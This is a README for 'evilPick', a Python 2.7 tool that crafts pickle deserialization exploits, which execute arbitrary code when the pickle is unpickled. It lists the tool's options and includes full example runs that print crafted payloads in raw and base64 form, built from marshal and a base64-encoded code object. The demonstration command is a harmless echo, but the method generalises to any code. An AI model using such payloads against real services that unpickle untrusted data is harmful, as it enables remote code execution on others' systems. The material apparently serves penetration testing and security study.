# evilPick
A simple Tool to automate Exploit Crafting from python2.7 code.

### options 
- -f --foo  file_name.py  
craft an exploit that, on deserialization, will execute the given python2.7 code   
- -e --encode base64/hex 
encode the crafted exploit in base64 or hex 
- -s --file  new_file
the crafted exploit is then saved in a file
- -d --dynamic
dynamically write your python code and hit CTRL-C in a new line to end the code


### Examples
example.py code :
```python
import os
os.system("echo Hello World")
```
running evilPick passing the example.py file :
```sh
$ python evilPick.py --foo example.py 
___________________________________________________________
[^] Do you want to encode it? ( base64 or hex,leave for unicode) :        
[*] Crafted Evil Packet: 

ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwAAAAABAAAAAgAAAEMAAABzHQAAAGQBAGQAAGwAAH0AAHwAAGoBAGQCAIMBAAFkAABTKAMAAABOaf////9zEAAAAGVjaG8gSGVsbG8gV29ybGQoAgAAAHQCAAAAb3N0BgAAAHN5c3RlbSgBAAAAUgAAAAAoAAAAACgAAAAAcwgAAAA8c3RyaW5nPnQDAAAAZm9vAQAAAHMEAAAAAAEMAQ=='
tRtRc__builtin__
globals
(tRS''
tR(tR.

___________________________________________________________
[^] Do you want to save it? (y/n, leave to skip):  y
[^] Insert exploit name: example_exploit
[*] Writing it in example_exploit

__________________________Job_Done_________________________
```
running evilPick in dynamic mode with encode base64 option :
```sh
$ python evilPick.py -d -e base64 
___________________________________________________________
[*] Write code till SIGINT, have fun!

|import os
|os.system("echo Hello World!")
|^C

___________________________________________________________
[*] Crafted Evil Packet: 

Y3R5cGVzCkZ1bmN0aW9uVHlwZQooY21hcnNoYWwKbG9hZHMKKGNiYXNlNjQKYjY0ZGVjb2RlCihTJ1l3QUFBQUFCQUFBQUFnQUFBRU1BQUFCekhRQUFBR1FCQUdRQUFHd0FBSDBBQUh3QUFHb0JBR1FDQUlNQkFBRmtBQUJUS0FNQUFBQk9hZi8vLy85ekVRQUFBR1ZqYUc4Z1NHVnNiRzhnVjI5eWJHUWhLQUlBQUFCMEFnQUFBRzl6ZEFZQUFBQnplWE4wWlcwb0FRQUFBRklBQUFBQUtBQUFBQUFvQUFBQUFITUlBQUFBUEhOMGNtbHVaejUwQXdBQUFHWnZid0VBQUFCekJBQUFBQUFCREFFPScKdFJ0UmNfX2J1aWx0aW5fXwpnbG9iYWxzCih0UlMnJwp0Uih0Ui4=

___________________________________________________________
[^] Do you want to save it? (y/n, leave to skip):  n
```

### Author
Lacerenza Francesco - Systems and Networks Security 
twitter: [@lacerenza_fra](https://twitter.com/lacerenza_fra)
linkedin: [lacerenzafrancesco](https://www.linkedin.com/in/francesco-lacerenza/)
